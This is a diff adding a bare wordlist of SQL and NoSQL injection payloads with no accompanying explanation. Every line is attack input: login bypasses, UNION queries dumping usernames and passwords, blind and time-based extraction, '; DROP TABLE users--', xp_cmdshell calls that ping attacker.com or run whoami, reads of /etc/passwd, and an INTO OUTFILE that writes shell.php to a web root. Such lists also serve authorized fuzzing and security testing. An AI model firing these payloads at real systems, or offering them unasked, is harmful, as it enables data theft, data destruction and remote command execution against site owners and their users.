@@ -1,0 +1,104 @@
+'
+''
+`
+')
+'))
+'--
+'--+
+' --
+'-- -
+'/*
+' #
+') --
+')) --
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR "1"="1
+" OR 1=1--
+`) OR 1=1--
+1' OR '1'='1
+1" OR "1"="1
+' OR 'x'='x
+') OR ('x'='x
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password,3 FROM users--
+' UNION SELECT table_name,2,3 FROM information_schema.tables--
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT 1,user(),database()--
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
+1 AND 1=1
+1 AND 1=2
+1 AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5(1))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+1' AND SLEEP(5) AND '1'='1
+' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--
+' AND 1=1 AND SLEEP(5)--
+'; DROP TABLE users--
+'; DROP DATABASE test--
+' ; exec master..xp_cmdshell 'ping attacker.com'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 1)='a
+' AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users WHERE username='admin')>64--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
+' AND IF((SELECT SUBSTR(username,1,1) FROM users LIMIT 1)='a',SLEEP(5),0)--
+1;SELECT LOAD_FILE('/etc/passwd')--
+1' UNION SELECT LOAD_FILE('/etc/passwd')--
+' INTO OUTFILE '/var/www/html/shell.php'--
+%27
+%22
+%27%20OR%20%271%27%3D%271
+%27%20UNION%20SELECT%20NULL--
+0x27
+0x27 OR 0x313d31
+' oR '1'='1
+' Or '1'='1
+' OR/**/1=1--
+'/**/OR/**/1=1--
+' /*!OR*/ 1=1--
+'||'1'='1
+'||(SELECT '')||'
+' OR 0x31=0x31--
+'; SELECT * FROM information_schema.tables--
+' HAVING 1=1--
+' GROUP BY 1--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 10--
+{"$gt": ""}
+{"$ne": null}
+{"$where": "sleep(5000)"}
+{"$regex": ".*"}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+'; DECLARE @q NVARCHAR(200);SET @q=0x53454c454354202a2046524f4d207573657273;EXEC(@q)--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),NULL,NULL--
+' UNION SELECT database(),NULL,NULL--
+' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--
